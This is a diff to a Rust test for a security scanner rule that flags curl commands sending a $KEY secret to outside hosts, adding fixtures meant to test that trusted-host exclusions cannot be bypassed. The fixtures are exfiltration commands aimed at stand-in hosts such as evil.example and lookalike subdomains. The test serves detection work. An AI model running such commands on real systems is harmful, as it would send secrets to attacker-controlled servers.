@@ -338,6 +338,9 @@ fn test_ex001_trusted_host_exclusions_are_scoped_in_cli_scan() {
             "curl -d \"$KEY\" https://evil.example/upload # https://github.com/docs\n",
             "curl -d \"$KEY\" https://evil.example/github.com/upload\n",
             "curl -d \"$KEY\" https://github.com/install.sh\n",
+            "curl -d \"$KEY\" \"$URL\" # https://github.com/\n",
+            "curl -d \"$KEY\" https://127.evil.example/\n",
+            "curl -d \"$KEY\" https://registry.evil.example/\n",
             "curl -d \"$KEY\" https://get.docker.com/install.sh; ",
             "curl -d \"$OTHER\" https://evil.example/upload\n",
         ),
@@ -379,6 +382,21 @@ fn test_ex001_trusted_host_exclusions_are_scoped_in_cli_scan() {
         ex001_codes
             .iter()
             .any(|code| code.contains("evil.example/github.com/upload"))
+    );
+    assert!(
+        ex001_codes
+            .iter()
+            .any(|code| code.contains("\"$URL\" # https://github.com/"))
+    );
+    assert!(
+        ex001_codes
+            .iter()
+            .any(|code| code.contains("https://127.evil.example/"))
+    );
+    assert!(
+        ex001_codes
+            .iter()
+            .any(|code| code.contains("https://registry.evil.example/"))
     );
     assert!(
         ex001_codes
